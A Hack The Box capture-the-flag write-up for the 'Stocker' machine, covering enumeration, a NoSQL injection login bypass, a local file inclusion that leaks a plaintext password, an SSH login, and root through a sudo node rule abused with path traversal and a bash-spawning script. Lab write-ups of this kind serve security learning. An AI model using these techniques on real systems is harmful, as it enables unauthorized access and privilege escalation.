---
layout: single
title: Stocker - Hack The Box
excerpt: "Stocker is a quick and fun easy box where're goint to exploit a no sql inyection also we're goint to use burpsuite to intercept the request and change the content-type to json then there will be an lfi to obtain credentials when we gain access to the login of a subdomain found we can connect with ssh and to become root we will only have to create a .js file."
date: 2023-01-15
classes: wide
header:
  teaser: /assets/images/htb-writeup-stocker/logo.jpg
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:  
  - LFI
  - NoSqli
---
![](/assets/images/htb-writeup-stocker/logo.jpg)

Stocker is a quick and fun linux easy box where're goint to exploit a no sql inyection also we're goint to use burpsuite to intercept the request and change the content-type to json then there will be an lfi to obtain credentials when we gain access to the login of a subdomain found we can connect with ssh and to become root we will only have to create a .js file.

## Port Scan

```
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-15 11:24 CST
Nmap scan report for 10.129.131.145
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3d:12:97:1d:86:bc:16:16:83:60:8f:4f:06:e6:d5:4e (RSA)
|   256 7c:4d:1a:78:68:ce:12:00:df:49:10:37:f9:ad:17:4f (ECDSA)
|_  256 dd:97:80:50:a5:ba:cd:7d:55:e8:27:ed:28:fd:aa:3b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://stocker.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can see a new subdomain of the machine stocker.htb add to your `/etc/hosts`

```
❯ /usr/bin/cat /etc/hosts | tail -n 1
10.129.131.145 stocker.htb 
```

It's working

```
❯ ping -c 1 stocker.htb
PING stocker.htb (10.129.131.145) 56(84) bytes of data.
64 bytes from stocker.htb (10.129.131.145): icmp_seq=1 ttl=63 time=180 ms

--- stocker.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 179.919/179.919/179.919/0.000 ms
```

These services are running

```
❯ whatweb http://stocker.htb
http://stocker.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.131.145], Meta-Author[Holger Koenemann], MetaGenerator[Eleventy v2.0.0], Script, Title[Stock - Coming Soon!], nginx[1.18.0]
```

This is the webpage

![/assets/images/htb-writeup-stocker/web1.png](/assets/images/htb-writeup-stocker/web1.png)

We can do fuzzing to discover other subdomains

```
❯ gobuster vhost -w /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 30 -u stocker.htb
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://stocker.htb
[+] Method:       GET
[+] Threads:      30
[+] Wordlist:     /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/01/15 11:32:20 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.stocker.htb (Status: 302) [Size: 28]
```

Add to your `/etc/hosts`

```
❯ /usr/bin/cat /etc/hosts | tail -n 1
10.129.131.145 stocker.htb dev.stocker.htb
```

It's working too

```
❯ ping -c 1 dev.stocker.htb
PING stocker.htb (10.129.131.145) 56(84) bytes of data.
64 bytes from stocker.htb (10.129.131.145): icmp_seq=1 ttl=63 time=175 ms

--- stocker.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 174.753/174.753/174.753/0.000 ms
```

We found a login

```
❯ curl http://dev.stocker.htb
Found. Redirecting to /login
```

```
❯ whatweb http://dev.stocker.htb/login
http://dev.stocker.htb/login [200 OK] Bootstrap, Cookies[connect.sid], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[connect.sid], IP[10.129.131.145], Meta-Author[Mark Otto, Jacob Thornton, and Bootstrap contributors], MetaGenerator[Hugo 0.84.0], PasswordField[password], Script, Title[Stockers Sign-in], X-Powered-By[Express], nginx[1.18.0]
```

This is the webpage

![/assets/images/htb-writeup-stocker/web2.png](/assets/images/htb-writeup-stocker/web2.png)

if we look for default credentials of the services it runs they don't work

We're going to use burpsuite to intercept the login panel

![/assets/images/htb-writeup-stocker/burp.png](/assets/images/htb-writeup-stocker/burp.png)

I remember the login panel of Shoppy machine is vulnerable a sqli maybe this too because they have similarities

Ok after trying we can change the Content-Type to Json and do a no sql injection

- [https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass](https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass)

![/assets/images/htb-writeup-stocker/xd.png](/assets/images/htb-writeup-stocker/xd.png)

After to click on forward we can see a store

![/assets/images/htb-writeup-stocker/car.png](/assets/images/htb-writeup-stocker/car.png)

I going to add something to the Cart

![/assets/images/htb-writeup-stocker/xdd.png](/assets/images/htb-writeup-stocker/xdd.png)

If you click on Submit Purchase we have a link and a order id

![/assets/images/htb-writeup-stocker/id.png](/assets/images/htb-writeup-stocker/id.png)

The link to this way 

![/assets/images/htb-writeup-stocker/link.png](/assets/images/htb-writeup-stocker/link.png)

We can intercept the Submit Purchase with burpsuite

![/assets/images/htb-writeup-stocker/xdd.png](/assets/images/htb-writeup-stocker/xdd.png)

We see a json we can abuse of this to make a LFI

![/assets/images/htb-writeup-stocker/json.png](/assets/images/htb-writeup-stocker/json.png)

We can see a new order id the machine is taking it like a purchase

![/assets/images/htb-writeup-stocker/orderid.png](/assets/images/htb-writeup-stocker/orderid.png)

If we copy the id we can see the `/etc/passwd` of the machine and users 

![/assets/images/htb-writeup-stocker/lfi.png](/assets/images/htb-writeup-stocker/lfi.png)

We have a lfi and the page use js maybe we can see configuration files with credentials of the user `angoose`

![/assets/images/htb-writeup-stocker/cred.png](/assets/images/htb-writeup-stocker/cred.png)

If we do the same copy the id and search in the webpage we found credentials 

![/assets/images/htb-writeup-stocker/gg.png](/assets/images/htb-writeup-stocker/gg.png)

`IHeardPassphrasesArePrettySecure`

We can try to connect with ssh

```
❯ ssh angoose@10.129.131.145
The authenticity of host '10.129.131.145 (10.129.131.145)' can't be established.
ECDSA key fingerprint is SHA256:DX/9+PB1w20dghcXwm9QPFH88qM0aiPr+RyA+wzHnng.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.131.145' (ECDSA) to the list of known hosts.
angoose@10.129.131.145's password: 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

angoose@stocker:~$
```

## User flag

```
angoose@stocker:~$ cat user.txt 
d12a44162b3b7fe2ef2c2e0830d8568a
angoose@stocker:~$ id
uid=1001(angoose) gid=1001(angoose) groups=1001(angoose)
angoose@stocker:~$ hostname
stocker
angoose@stocker:~$
```

## Root

After enumerating we have a password so at sudoers level we can run a js with node as root user

```
angoose@stocker:~$ sudo -l
[sudo] password for angoose: 
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
angoose@stocker:~$ 
```

```
angoose@stocker:~$ cat pwn.js 
const fs = require("child_process").spawn("/usr/bin/bash", {stdio: [0, 1, 2]})
angoose@stocker:~$ 
```

```
angoose@stocker:~$ sudo node /usr/local/scripts/../../../home/angoose/pwn.js
root@stocker:/home/angoose# cd 
root@stocker:~# whoami
root
root@stocker:~# id
uid=0(root) gid=0(root) groups=0(root)
root@stocker:~# cat /root/root.txt
21ecb34b50ca39544323e071cefd0976
root@stocker:~# hostname
stocker
root@stocker:~# 
```






